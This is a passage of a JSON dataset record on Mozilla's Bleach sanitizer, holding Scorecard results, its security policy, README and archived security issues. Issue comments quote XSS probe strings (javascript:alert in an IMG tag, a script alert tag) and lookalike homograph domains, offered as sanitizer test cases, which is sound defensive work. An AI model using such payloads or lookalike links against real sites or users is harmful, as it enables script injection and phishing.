                        "Info:   0 out of   3 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   3 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: SECURITY.md:1",
                        "Info: Found linked content: SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: SECURITY.md:1",
                        "Info: Found text in security policy: SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/test.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/mozilla/bleach/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\n## Supported Versions\n\nUse this section to tell people about which versions of your project are\ncurrently being supported with security updates.\n\n| Version | Supported          |\n| ------- | ------------------ |\n| 4.1.x   | :white_check_mark: |\n| < 4     | :x:                |\n\n## Reporting a Vulnerability\n\nIf you believe that you've found a security vulnerability, please [file a secure\nbug report in our bug tracker](https://bugzilla.mozilla.org/enter_bug.cgi?assigned_to=nobody%40mozilla.org&product=Webtools&component=Bleach-security&groups=webtools-security) or send an email to *security AT mozilla DOT org*.\n\nFor more information on security-related bug disclosure and the PGP key to use\nfor sending encrypted mail or to verify responses received from that address,\nplease read our wiki page at https://www.mozilla.org/en-US/security/#For_Developers\n",
        "project_all_labels": [
            "clean",
            "critical",
            "css",
            "dependencies",
            "docs",
            "enhancement",
            "html5lib",
            "linkify",
            "needs-your-help",
            "regression",
            "security",
            "testing",
            "untriaged"
        ],
        "README_content": "======\nBleach\n======\n\n.. image:: https://github.com/mozilla/bleach/workflows/Test/badge.svg\n   :target: https://github.com/mozilla/bleach/actions?query=workflow%3ATest\n\n.. image:: https://github.com/mozilla/bleach/workflows/Lint/badge.svg\n   :target: https://github.com/mozilla/bleach/actions?query=workflow%3ALint\n\n.. image:: https://badge.fury.io/py/bleach.svg\n   :target: http://badge.fury.io/py/bleach\n\n**NOTE: 2023-01-23: Bleach is deprecated.** See issue:\n`<https://github.com/mozilla/bleach/issues/698>`__\n\nBleach is an allowed-list-based HTML sanitizing library that escapes or strips\nmarkup and attributes.\n\nBleach can also linkify text safely, applying filters that Django's ``urlize``\nfilter cannot, and optionally setting ``rel`` attributes, even on links already\nin the text.\n\nBleach is intended for sanitizing text from *untrusted* sources. If you find\nyourself jumping through hoops to allow your site administrators to do lots of\nthings, you're probably outside the use cases. Either trust those users, or\ndon't.\n\nBecause it relies on html5lib_, Bleach is as good as modern browsers at dealing\nwith weird, quirky HTML fragments. And *any* of Bleach's methods will fix\nunbalanced or mis-nested tags.\n\nThe version on GitHub_ is the most up-to-date and contains the latest bug\nfixes. You can find full documentation on `ReadTheDocs`_.\n\n:Code:           https://github.com/mozilla/bleach\n:Documentation:  https://bleach.readthedocs.io/\n:Issue tracker:  https://github.com/mozilla/bleach/issues\n:License:        Apache License v2; see LICENSE file\n\n\nReporting Bugs\n==============\n\nFor regular bugs, please report them `in our issue tracker\n<https://github.com/mozilla/bleach/issues>`_.\n\nIf you believe that you've found a security vulnerability, please `file a secure\nbug report in our bug tracker\n<https://bugzilla.mozilla.org/enter_bug.cgi?assigned_to=nobody%40mozilla.org&product=Webtools&component=Bleach-security&groups=webtools-security>`_\nor send an email to *security AT mozilla DOT org*.\n\nFor more information on security-related bug disclosure and the PGP key to use\nfor sending encrypted mail or to verify responses received from that address,\nplease read our wiki page at\n`<https://www.mozilla.org/en-US/security/#For_Developers>`_.\n\n\nSecurity\n========\n\nBleach is a security-focused library.\n\nWe have a responsible security vulnerability reporting process. Please use\nthat if you're reporting a security issue.\n\nSecurity issues are fixed in private. After we land such a fix, we'll do a\nrelease.\n\nFor every release, we mark security issues we've fixed in the ``CHANGES`` in\nthe **Security issues** section. We include any relevant CVE links.\n\n\nInstalling Bleach\n=================\n\nBleach is available on PyPI_, so you can install it with ``pip``::\n\n    $ pip install bleach\n\n\nUpgrading Bleach\n================\n\n.. warning::\n\n   Before doing any upgrades, read through `Bleach Changes\n   <https://bleach.readthedocs.io/en/latest/changes.html>`_ for backwards\n   incompatible changes, newer versions, etc.\n\n   Bleach follows `semver 2`_ versioning. Vendored libraries will not\n   be changed in patch releases.\n\n\nBasic use\n=========\n\nThe simplest way to use Bleach is:\n\n.. code-block:: python\n\n    >>> import bleach\n\n    >>> bleach.clean('an <script>evil()</script> example')\n    u'an &lt;script&gt;evil()&lt;/script&gt; example'\n\n    >>> bleach.linkify('an http://example.com url')\n    u'an <a href=\"http://example.com\" rel=\"nofollow\">http://example.com</a> url'\n\n\nCode of Conduct\n===============\n\nThis project and repository is governed by Mozilla's code of conduct and\netiquette guidelines. For more details please see the `CODE_OF_CONDUCT.md\n</CODE_OF_CONDUCT.md>`_\n\n\n.. _html5lib: https://github.com/html5lib/html5lib-python\n.. _GitHub: https://github.com/mozilla/bleach\n.. _ReadTheDocs: https://bleach.readthedocs.io/\n.. _PyPI: https://pypi.org/project/bleach/\n.. _semver 2: https://semver.org/\n",
        "num_commits": 925,
        "project_age_days": 5367,
        "project_created_at": "2010-02-19",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-29",
        "num_contributors": 66,
        "num_pull": 358,
        "num_issues": 736,
        "num_opening_issue": 5,
        "project_size(kB)": 1236,
        "num_stargazers": 2651,
        "num_watchers": 2651,
        "num_forks": 252,
        "num_subscribers": 45,
        "SecurityPolicy_created_at": "2019-12-03 22:17:09",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "248749ad56e2e72db211e121a9538a3fb89674f5",
                "url": "https://github.com/mozilla/bleach/commit/248749ad56e2e72db211e121a9538a3fb89674f5",
                "date": "2021-08-25 18:51:11"
            },
            {
                "commit_id": "23d1397b66bdf2034c67d8a5a14f501e49cf2160",
                "url": "https://github.com/mozilla/bleach/commit/23d1397b66bdf2034c67d8a5a14f501e49cf2160",
                "date": "2021-08-03 17:09:03"
            },
            {
                "commit_id": "842fcb4a05e59d9a22dafb8c51865ee79d753c03",
                "url": "https://github.com/mozilla/bleach/commit/842fcb4a05e59d9a22dafb8c51865ee79d753c03",
                "date": "2021-02-01 17:05:39"
            },
            {
                "commit_id": "17dceafa0037fc45feae573bff0904b2ec1e185a",
                "url": "https://github.com/mozilla/bleach/commit/17dceafa0037fc45feae573bff0904b2ec1e185a",
                "date": "2020-09-16 13:29:55"
            },
            {
                "commit_id": "f2e3728500d44ac0decc217393a18ab4c5f15069",
                "url": "https://github.com/mozilla/bleach/commit/f2e3728500d44ac0decc217393a18ab4c5f15069",
                "date": "2019-12-03 22:17:09"
            }
        ],
        "project_security_labels": [
            "security"
        ],
        "security_issues": [
            {
                "url": "https://github.com/mozilla/bleach/issues/527",
                "title": "Request CVE for ReDoS fixed in 3.1.4?",
                "labels": [
                    "security"
                ],
                "user": "hartwork",
                "issue_author_association": "NONE",
                "number": 527,
                "id": 589116461,
                "state": "closed",
                "project_created_at": "2020-03-27T12:59:04Z",
                "closed_at": "2020-03-30T19:39:24Z",
                "body": "Hi!\r\n\r\nThe [ReDoS](https://en.wikipedia.org/wiki/ReDoS) fixed in 3.1.4 does not seem to have a CVE. Have you considered requesting a CVE for this?",
                "comments": [
                    {
                        "body": "Yep! It's somewhat complicated because Mozilla assigns the CVE (not Github), but the reporter already requested one on the security@mozilla.org mailing list.\r\n\r\nI'll leave this open until one is assigned them update the advisory.\r\n\r\nThanks for following up!",
                        "user": "g-k",
                        "issue_author_association": "COLLABORATOR",
                        "project_created_at": "2020-03-27T14:05:20Z",
                        "url": "https://github.com/mozilla/bleach/issues/527#issuecomment-605018787"
                    },
                    {
                        "body": "@hartwork this was assigned CVE-2020-6817. I added the link to it on mitre https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-6817 which include the advisory details soon.",
                        "user": "g-k",
                        "issue_author_association": "COLLABORATOR",
                        "project_created_at": "2020-03-30T19:39:24Z",
                        "url": "https://github.com/mozilla/bleach/issues/527#issuecomment-606203934"
                    },
                    {
                        "body": "Thank you!",
                        "user": "hartwork",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-03-30T19:42:28Z",
                        "url": "https://github.com/mozilla/bleach/issues/527#issuecomment-606205413"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/mozilla/bleach/issues/464",
                "title": "`.linkify` vulnerable to punycode attacks",
                "labels": [
                    "security",
                    "linkify"
                ],
                "user": "jvanasco",
                "issue_author_association": "CONTRIBUTOR",
                "number": 464,
                "id": 474181380,
                "state": "closed",
                "project_created_at": "2019-07-29T17:59:07Z",
                "closed_at": "2023-10-06T17:53:52Z",
                "body": "This was originally filed to the [security bug tracker](https://bugzilla.mozilla.org/show_bug.cgi?id=1566541) but it was decided this is not within the security threat model of the library.\r\n\r\n---\r\n\r\nSteps to reproduce:\r\n\r\nI decided to start work on a PR for the Bleach issue concerning localized domains (https://github.com/mozilla/bleach/issues/368). When building test-cases, I decided to generate one for \"punycode attacks\" aka [IDN Homograph Attack](https://en.wikipedia.org/wiki/IDN_homograph_attack) when unicode lookalike/homoglyph characters are replaced in a link text.\r\n\r\nThis allows a malicious attacker to create a link to a lookalike domain name.\r\n\r\nFor example:\r\n\r\n    googĺe.com\txn--googe-95a.com\r\n    wikipediа.org wikipedi\\u0430.org\r\n\r\n    print linkify(\"http://googĺe.com\")\r\n    print linkify(\"http://wikipediа.org\")\r\n\r\nModern browsers defend against this somewhat by customizing what appears in the display bar once it is clicked; however they do not control (to my knowledge) what happens on the page.\r\n\r\nActual results:\r\n\r\n    print linkify(\"foo http://googĺe.com bar\")\r\n    foo <a href=\"http://googĺe.com\" rel=\"nofollow\">http://googĺe.com</a> bar\r\n\r\n    print linkify(\"foo http://wikipediа.org bar\")\r\n    foo <a href=\"http://wikipediа.org\" rel=\"nofollow\">http://wikipediа.org</a> bar\r\n\r\nExpected results:\r\n\r\nSince bleach is a security focused library, I think it should - be default - approach this situation how the strictest of modern browsers do, but allow for other use cases as this approach is very much tailored to \"English users\" and not the international community. I think a Boolean argument to linkify could be used to provide security by default, and allow non-english alphabet users the ability to opt-out.\r\n\r\nDefault: the HREF should be be the punycode version\r\n\r\n    <a href=\"http://xn--googe-95a.com\" rel=\"nofollow\">http://googĺe.com</a>\r\n\r\nOptional Strict: Linkified Text is also punycode\r\n\r\n    <a href=\"http://xn--googe-95a.com\" rel=\"nofollow\">http://xn--googe-95a.com</a>\r\n\r\nOptional Loose: allow the text as-is and leave everything to the browser\r\n\r\n     <a href=\"http://googĺe.com\" rel=\"nofollow\">http://googĺe.com</a>\r\n\r\nThis functionality could also be implemented in a callback function, which would accept as input two arguments: the raw link and the context ('a' href value, 'a' node/display text,  bare html to be turned into an a tag).\r\n\r\nHandling this via a callback is IMHO the best option as it would allow for bleach to abandon the regex of locked-down TLDs that seems to create more issues than it solves, while allowing users to still lock them down if wanted.",
                "comments": [
                    {
                        "body": "I don't think this is something I'm going to work on and I'm inclined to close it out as out-of-scope.\r\n\r\nHas anyone looked into whether this could be done as a standalone filter that runs after the linkify filter? Then it could cover links from the original HTML after a clean pass as well as links created with linkify.",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2022-02-10T02:33:40Z",
                        "url": "https://github.com/mozilla/bleach/issues/464#issuecomment-1034430087"
                    },
                    {
                        "body": "I think this should be done as a filter that follows the linkify filter, but I'm not going to work on this.",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-10-06T17:53:52Z",
                        "url": "https://github.com/mozilla/bleach/issues/464#issuecomment-1751190069"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/mozilla/bleach/pull/323",
                "title": "Convert invisible characters to ? in Characters tokens",
                "labels": [
                    "security"
                ],
                "user": "willkg",
                "issue_author_association": "MEMBER",
                "number": 323,
                "id": 261345805,
                "state": "closed",
                "project_created_at": "2017-09-28T14:47:11Z",
                "closed_at": "2017-09-28T14:53:17Z",
                "body": "This prevents someone from using backspace and other invisible characters from\r\ntricking a user into copy and pasting a seemingly innocuous command into doing\r\nsomething they really don't want to do.\r\n\r\nI made the replacement character a constant figuring people can replace it if\r\nthey want something different.\r\n\r\nFixes #298.",
                "comments": [
                    {
                        "body": "Once Travis is ok, I'm landing this and pushing out Bleach 2.1.",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-09-28T14:47:26Z",
                        "url": "https://github.com/mozilla/bleach/pull/323#issuecomment-332860090"
                    },
                    {
                        "body": "We have a process for working on and reviewing security-related changes. This was reviewed there. Given that, I'm merging this.",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-09-28T14:53:12Z",
                        "url": "https://github.com/mozilla/bleach/pull/323#issuecomment-332862087"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/mozilla/bleach/pulls/323",
                    "merged_at": "2017-09-28T14:53:16Z"
                }
            },
            {
                "url": "https://github.com/mozilla/bleach/issues/298",
                "title": "Should bleach sanitize certain python escape characters?",
                "labels": [
                    "security"
                ],
                "user": "jvanasco",
                "issue_author_association": "CONTRIBUTOR",
                "number": 298,
                "id": 247849596,
                "state": "closed",
                "project_created_at": "2017-08-03T22:08:29Z",
                "closed_at": "2017-09-28T14:53:17Z",
                "body": "doing an audit and updating some tests, I decided to put bleach through some of python's escape characters.\r\n\r\n* https://docs.python.org/2/reference/lexical_analysis.html#string-literals\r\n* https://docs.python.org/3.6/reference/lexical_analysis.html#string-and-bytes-literals\r\n\r\nThese were largely left as-is, and probably should be sanitized:\r\n\r\n* bell\r\n* vertical tab\r\n* backspace\r\n* formfeed\r\n\r\nthere is also the `\\N{name}` (unicode decode swap), and `\\ooo` (octal), and `\\xhh` (hex) ways to drop in some of these chars as well.\r\n\r\n\r\n# questionable \r\n\r\nBell `\\a`\r\n\r\n```\r\n>>> print(bleach.clean(\"a\\ac\"))\r\nac\r\n>>> print(bleach.clean(\"a\\ac\")).__repr__()\r\nu'a\\x07c'\r\n```\r\n\r\nVertical Tab `\\v`\r\n\r\n```\r\n>>> print(bleach.clean(\"a\\vc\"))\r\na\r\n c\r\n>>> print(bleach.clean(\"a\\vc\")).__repr__()\r\nu'a\\x0bc'\r\n```\r\n\r\nBackspace `\\b`\r\n\r\n```\r\n>>> print(bleach.clean(\"a\\bc\"))\r\nc\r\n>>> print(bleach.clean(\"a\\bc\")).__repr__()\r\nu'a\\x08c'\r\n```\r\n\r\nFormfeed `\\f`\r\n\r\n```\r\n>>> print(bleach.clean(\"a\\fc\"))\r\nc\r\n>>> print(bleach.clean(\"a\\fc\")).__repr__()\r\nu'a\\x0cc'\r\n```\r\n\r\n# ok\r\n\r\nCarriage Return\t`\\r`\r\n\r\n```\r\n>>> print(bleach.clean(\"a\\rc\"))\r\na\r\nc\r\n>>> print(bleach.clean(\"a\\rc\")).__repr__()\r\nu'a\\nc'\r\n```\r\n\r\nLine Feed `\\n`\r\n\r\n```\r\n>>> print(bleach.clean(\"a\\nc\"))\r\na\r\nc\r\n>>> print(bleach.clean(\"a\\nc\")).__repr__()\r\nu'a\\nc'\r\n```\r\n\r\nTab `\\n`\r\n\r\n```\r\n>>> print(bleach.clean(\"a\\tc\"))\r\na\tc\r\n>>> print(bleach.clean(\"a\\tc\")).__repr__()\r\nu'a\\tc'\r\n```\t ",
                "comments": [
                    {
                        "body": "Do any of these create unsafe HTML scenarios? If so, please write up a security bug. If not, then I don't think this is something Bleach should be doing.",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-08-03T22:32:49Z",
                        "url": "https://github.com/mozilla/bleach/issues/298#issuecomment-320107842"
                    },
                    {
                        "body": "I spent a bunch of time looking into this. A web browser (Firefox, links, etc) will show glyphs for characters covered by this issue. There's no way anyone would look at that and want to copy/paste it.\r\n\r\nHowever, printing `bleach.clean()` output to a terminal like this will interpret these characters causing the above problem because that's not a web browser rendering HTML--it's just printing a string to a terminal.\r\n\r\nRegardless, it seems helpful to sanitize characters in Characters tokens by converting them to the relevant character entities.\r\n\r\nUsing the above example, after this change we'd get something like this:\r\n\r\n```\r\n>>> print(bleach.clean(\"a\\ac\"))\r\na&#x07;c\r\n```\r\n\r\nI think that should work fine in web browsers, too. I'll verify that when I get there.\r\n\r\nI'll try to get this done in the next few days and then do a Bleach 2.1 release.",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-09-27T15:47:44Z",
                        "url": "https://github.com/mozilla/bleach/issues/298#issuecomment-332566221"
                    },
                    {
                        "body": "I'm going to fix this for Bleach 2.1, but not for older versions of Bleach. That's going to be a problem for anyone who hasn't updated to Bleach 2, yet.\r\n\r\nFor those people, I suggest doing something like the following:\r\n\r\n```\r\ndef remove_invisible_characters(text):\r\n    for c in ('\\a', '\\b', '\\f', '\\v'):\r\n        text = text.replace(c, '')\r\n    return text\r\n```\r\n\r\nThen wrap `bleach.clean()` calls with that like this:\r\n\r\n```\r\ntext = remove_invisible_characters(bleach.clean(dirty_text))\r\n```",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-09-28T14:28:31Z",
                        "url": "https://github.com/mozilla/bleach/issues/298#issuecomment-332854092"
                    },
                    {
                        "body": "Thanks for handling this, Will!\r\n\r\nFor the benefit of others- Will & I had a side-chat on this on this in the security tracker.  Some, not all, browsers will display glyphs for the ASCII control characters.  The newest version of Firefox and most versions of text browsers will display glyphs, but Chrome/Safari and older firefox versions will show the empty space.",
                        "user": "jvanasco",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-09-28T15:40:13Z",
                        "url": "https://github.com/mozilla/bleach/issues/298#issuecomment-332876830"
                    },
                    {
                        "body": "Just to clarify, so `\\n` character is good to go and it is not cleaned?",
                        "user": "Rogalek",
                        "issue_author_association": "NONE",
                        "project_created_at": "2020-02-05T08:39:53Z",
                        "url": "https://github.com/mozilla/bleach/issues/298#issuecomment-582299278"
                    },
                    {
                        "body": "@Rogalek yes. \\n only affects display in html source or within ‘pre’ tags. You may want to run a regex to replace all and duplicate white space with a single space.",
                        "user": "jvanasco",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2020-02-05T13:51:28Z",
                        "url": "https://github.com/mozilla/bleach/issues/298#issuecomment-582416748"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/mozilla/bleach/issues/242",
                "title": "verify sanitizated output for regression tests",
                "labels": [
                    "security",
                    "clean",
                    "needs-your-help"
                ],
                "user": "willkg",
                "issue_author_association": "MEMBER",
                "number": 242,
                "id": 196516751,
                "state": "closed",
                "project_created_at": "2016-12-19T20:47:10Z",
                "closed_at": "2023-10-06T18:53:10Z",
                "body": "In pull #241, I added regression tests for `bleach.clean`. We should verify the output for those regression tests.",
                "comments": [
                    {
                        "body": "Tagging @g-k with this one.",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-02-16T21:57:24Z",
                        "url": "https://github.com/mozilla/bleach/issues/242#issuecomment-280474627"
                    },
                    {
                        "body": "👍 I'm planning to pull in the test page from https://cure53.de/purify and modify it to POST to a test server that calls `bleach.clean` and plugs the result back into the DOM.\r\n\r\nHopefully we can reuse their karma test runner to easily check against browsers too: https://github.com/cure53/DOMPurify/blob/master/test/karma.conf.js",
                        "user": "g-k",
                        "issue_author_association": "COLLABORATOR",
                        "project_created_at": "2017-02-22T14:59:39Z",
                        "url": "https://github.com/mozilla/bleach/issues/242#issuecomment-281693163"
                    },
                    {
                        "body": "The output is probably fine.",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2023-10-06T18:53:10Z",
                        "url": "https://github.com/mozilla/bleach/issues/242#issuecomment-1751270865"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/mozilla/bleach/issues/168",
                "title": "need to create new responsible disclosure process",
                "labels": [
                    "security"
                ],
                "user": "willkg",
                "issue_author_association": "MEMBER",
                "number": 168,
                "id": 111917869,
                "state": "closed",
                "project_created_at": "2015-10-16T21:55:04Z",
                "closed_at": "2015-10-26T14:41:23Z",
                "body": "@jsocol just passed off bleach to us. We need to create a new responsible disclosure process and document it in the `docs/`, the `README` and anywhere else it makes sense to have.\n",
                "comments": [
                    {
                        "body": "I'm working on this today. It might take a few days to figure out. If it looks like it'll take longer than that, I'll put in a stopgap.\n",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2015-10-19T17:30:13Z",
                        "url": "https://github.com/mozilla/bleach/issues/168#issuecomment-149289868"
                    },
                    {
                        "body": "I talked with Lonnen, Jannis and Julien and we've decided to use the existing Mozilla responsible security disclosure process.\n\nI'm creating a Bugzilla component for bleach. After all that's built, then I'll work out the instructions for sending in security issues via bugzilla and by email and update all the documentation.\n",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2015-10-21T20:27:43Z",
                        "url": "https://github.com/mozilla/bleach/issues/168#issuecomment-150015082"
                    },
                    {
                        "body": "I updated all the places I saw the security-related bug disclosure process:\n1. `README.rst`\n2. `CONTRIBUTING.rst`\n3. index page of the docs: http://bleach.readthedocs.org/en/latest/\n4. PyPI: https://pypi.python.org/pypi/bleach/1.4.2\n\nIf there are other places I missed, please reopen and let me know.\n",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2015-10-26T14:44:47Z",
                        "url": "https://github.com/mozilla/bleach/issues/168#issuecomment-151160915"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/mozilla/bleach/issues/69",
                "title": "Linkify can hit maximum recursion depth",
                "labels": [
                    "security",
                    "linkify"
                ],
                "user": "jsocol",
                "issue_author_association": "CONTRIBUTOR",
                "number": 69,
                "id": 5415885,
                "state": "closed",
                "project_created_at": "2012-07-03T20:28:20Z",
                "closed_at": "2012-07-03T20:37:34Z",
                "body": "Currently you can construct a string that will cause `linkify` to raise a `RuntimeError`. That should be fixed ASAP.\n",
                "comments": [
                    {
                        "body": "97ade5b9ddf3f210f0d3174431e0139b005e75fc\n",
                        "user": "jsocol",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2012-07-03T20:37:34Z",
                        "url": "https://github.com/mozilla/bleach/issues/69#issuecomment-6745851"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/mozilla/bleach/issues/66",
                "title": "add tests for XSS examples in OWASP testing guide",
                "labels": [
                    "security",
                    "testing",
                    "clean"
                ],
                "user": "graingert",
                "issue_author_association": "CONTRIBUTOR",
                "number": 66,
                "id": 5299150,
                "state": "closed",
                "project_created_at": "2012-06-27T15:06:09Z",
                "closed_at": "2017-07-28T14:10:02Z",
                "body": "Adding all the tests from http://ha.ckers.org/xss.html would be a good idea\n",
                "comments": [
                    {
                        "body": "I will be updating the test folder with this list please assign to me\n",
                        "user": "shavyg2",
                        "issue_author_association": "NONE",
                        "project_created_at": "2013-09-26T20:18:54Z",
                        "url": "https://github.com/mozilla/bleach/issues/66#issuecomment-25200170"
                    },
                    {
                        "body": "when ever i do \nbleach.clean('<IMG SRC=`javascript:alert(\"RSnake says, \\'XSS\\'\")`>')\n\nthe return value i get is\n\nu'&lt;img src=\"`javascript:alert(\"RSnake\" says,=\"\" \\'xss\\'\")`=\"\"&gt;'\n\ni am curious as to why the RSnake has to quotes around it and the =\"\"\n\nis this intended behavior?\n",
                        "user": "shavyg2",
                        "issue_author_association": "NONE",
                        "project_created_at": "2013-09-26T20:42:31Z",
                        "url": "https://github.com/mozilla/bleach/issues/66#issuecomment-25202055"
                    },
                    {
                        "body": "I get: \n\n``` python\nPython 2.7.5+ (default, Sep 19 2013, 13:48:49) \n[GCC 4.8.1] on linux2\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import bleach\n>>> bleach.clean(\"\")\nu'''\n```\n",
                        "user": "graingert",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2013-09-27T16:14:48Z",
                        "url": "https://github.com/mozilla/bleach/issues/66#issuecomment-25257251"
                    },
                    {
                        "body": "funnily enough i didn't realize but github is stripping out my post. I will find away to post this tho\n",
                        "user": "shavyg2",
                        "issue_author_association": "NONE",
                        "project_created_at": "2013-09-28T03:43:20Z",
                        "url": "https://github.com/mozilla/bleach/issues/66#issuecomment-25289901"
                    },
                    {
                        "body": "ah you probably want to do\n\n`````` markdown\n```html\n<script>alert('foo');</script>\n``````\n",
                        "user": "graingert",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2013-09-28T09:51:13Z",
                        "url": "https://github.com/mozilla/bleach/issues/66#issuecomment-25295235"
                    },
                    {
                        "body": "https://help.github.com/articles/github-flavored-markdown#syntax-highlighting\n",
                        "user": "graingert",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2013-09-28T09:51:42Z",
                        "url": "https://github.com/mozilla/bleach/issues/66#issuecomment-25295244"
                    },
                    {
                        "body": "The site in question isn't available anymore. Looks like some/all of the content was moved to the OWASP testing guide, so I grabbed the stuff in the appendix there.\r\n\r\nHaving said that, I'm not sure what \"enough\" entails, so I'm going to change the scope of this to \"add tests for the XSS examples listed in the OWASP guide\".",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2016-12-19T20:44:47Z",
                        "url": "https://github.com/mozilla/bleach/issues/66#issuecomment-268073229"
                    },
                    {
                        "body": "@willkg sucky, I remember back in 2012, http://ha.ckers.org/xss.html was pretty great.",
                        "user": "graingert",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2016-12-19T23:11:34Z",
                        "url": "https://github.com/mozilla/bleach/issues/66#issuecomment-268105933"
                    },
                    {
                        "body": "@willkg here's the last good snapshot: https://web.archive.org/web/20120717070023/http://ha.ckers.org/xss.html",
                        "user": "graingert",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2016-12-19T23:14:22Z",
                        "url": "https://github.com/mozilla/bleach/issues/66#issuecomment-268106458"
                    },
                    {
                        "body": "@willkg and I've got a snapshot on github https://github.com/graingert/xss",
                        "user": "graingert",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2016-12-19T23:21:10Z",
                        "url": "https://github.com/mozilla/bleach/issues/66#issuecomment-268107677"
                    },
                    {
                        "body": "@graingert Can you go through and add those? If you use the system I used for regression tests, it's not too hard.",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2016-12-20T00:51:01Z",
                        "url": "https://github.com/mozilla/bleach/issues/66#issuecomment-268122370"
                    },
                    {
                        "body": "Sorry I'm way more busy than I was 4 years ago! ",
                        "user": "graingert",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2016-12-20T00:53:39Z",
                        "url": "https://github.com/mozilla/bleach/issues/66#issuecomment-268122734"
                    },
                    {
                        "body": "I added some stuff a while back. We can add new tests as needed. I don't think we need to keep this open forever.",
                        "user": "willkg",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2017-07-28T14:10:02Z",
                        "url": "https://github.com/mozilla/bleach/issues/66#issuecomment-318661943"
                    }
                ],
                "pull_request": null
            }
        ],
        "SecurityPolicy_reporting_mechanism": "email_external",
        "num_security_issues_after_policy": 1,
        "num_security_issue_and_pull": 8,
        "security_issues_created_after_policy": [
            {
                "url": "https://github.com/mozilla/bleach/issues/527",
                "title": "Request CVE for ReDoS fixed in 3.1.4?",
                "labels": [
                    "security"
                ],
                "user": "hartwork",
                "issue_author_association": "NONE",
                "number": 527,
                "id": 589116461,
                "state": "closed",
                "project_created_at": "2020-03-27T12:59:04Z",
                "closed_at": "2020-03-30T19:39:24Z",
